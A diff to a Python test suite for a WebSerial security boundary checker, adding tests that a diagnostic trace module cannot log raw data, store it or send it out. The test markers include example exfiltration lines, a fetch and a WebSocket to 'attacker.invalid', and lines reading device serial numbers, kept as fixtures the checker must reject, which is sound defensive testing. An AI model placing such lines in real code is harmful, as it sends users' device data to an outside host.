@@ -64,6 +64,8 @@ class WebSerialAuthorityPolicyTests(unittest.TestCase):
             check_webserial_boundary.DECLARATION,
             check_webserial_boundary.FACADE,
             check_webserial_boundary.FACADE_DECLARATION,
+            check_webserial_boundary.DIAGNOSTIC_TRACE,
+            check_webserial_boundary.DIAGNOSTIC_TRACE_DECLARATION,
             check_webserial_boundary.APP,
         ):
             sources = copy.deepcopy(self.sources)
@@ -109,8 +111,8 @@ class WebSerialAuthorityPolicyTests(unittest.TestCase):
 
         sources = copy.deepcopy(self.sources)
         sources[adapter] = sources[adapter].replace(
-            "const discovery = new WasmReadonlySerialDiscovery();",
-            "const discovery = this.discoveryFactory();",
+            "discovery = new WasmReadonlySerialDiscovery();",
+            "discovery = this.discoveryFactory();",
         )
         self.assertTrue(check_webserial_boundary.source_authority_errors(sources))
 
@@ -173,6 +175,31 @@ class WebSerialAuthorityPolicyTests(unittest.TestCase):
             "localStorage.setItem('device', value)",
         ):
             self.rejected(str(check_webserial_boundary.FACADE), marker)
+
+    def test_diagnostic_trace_cannot_gain_raw_data_or_an_outbound_sink(self) -> None:
+        diagnostic = str(check_webserial_boundary.DIAGNOSTIC_TRACE)
+        for marker in (
+            "console.log(candidate);",
+            "localStorage.setItem('trace', value);",
+            "indexedDB.open('trace');",
+            "fetch('https://attacker.invalid', { body: rawBytes });",
+            "new WebSocket('wss://attacker.invalid');",
+            "const rawFrame = candidate.payload;",
+            "const usbVendorId = port.getInfo().usbVendorId;",
+            "const serialNumber = device.serialNumber;",
+        ):
+            self.rejected(diagnostic, marker)
+
+    def test_diagnostic_capacity_and_fixed_field_gate_cannot_be_removed(self) -> None:
+        for marker in (
+            "DIAGNOSTIC_TRACE_CAPACITY = 200",
+            "capacity < 100 || capacity > 250",
+            "ALLOWED_KEYS",
+        ):
+            sources = copy.deepcopy(self.sources)
+            diagnostic = check_webserial_boundary.DIAGNOSTIC_TRACE
+            sources[diagnostic] = sources[diagnostic].replace(marker, "REMOVED_BOUNDARY")
+            self.assertTrue(check_webserial_boundary.source_authority_errors(sources))
 
 
 if __name__ == "__main__":
